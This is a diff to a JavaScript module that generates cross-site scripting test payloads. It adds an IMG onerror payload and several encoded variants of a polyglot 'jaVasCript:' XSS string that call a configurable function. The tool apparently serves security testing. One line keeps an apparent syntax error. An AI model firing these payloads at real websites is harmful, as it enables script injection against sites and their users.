@@ -39,8 +39,17 @@ module.exports = function(options) {
       'js4%22,x:' + fn + '%28%22' + getPayloadMessage(14) + '%22%29,y:%22',
 
       '>"\'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;' +
-      encodeURIComponent(entities.encode(fn + "('" + getPayloadMessage(15)  + "')" + , {encodeEverything: true}))
+      encodeURIComponent(entities.encode(fn + "('" + getPayloadMessage(15)  + "')" + , {encodeEverything: true})),
 
+      "<IMG SRC='x' onerror='javascript:console.error(&quot;" + getPayloadMessage(16) + "&quot;);'>",
+
+      "jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=" + fn + "('" + getPayloadMessage(17) + "') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=" + fn + "('" + getPayloadMessage(17) + "')//&gt;\x3e",
+
+      'jaVasCript:/*-/*`/*\`/*&apos;/*"/**/(/* */oNcliCk=' + fn + '("' + getPayloadMessage(18) +'") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=' + fn + '("' + getPayloadMessage(18) + '")//>\x3e',
+
+      "jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=" + fn + "(%27" + getPayloadMessage(19) + "%27)%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=" + fn + "(%27" + getPayloadMessage(19) + "%27)//%3E%5Cx3e",
+
+      "jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=" + fn + "('" + getPayloadMessage(20) + "') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=" + fn + "('" + getPayloadMessage(20) + "')//>\x3e",
 
       // TODO: incorporate fn & getPayloadMessage commands into these payloads:
       // `<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
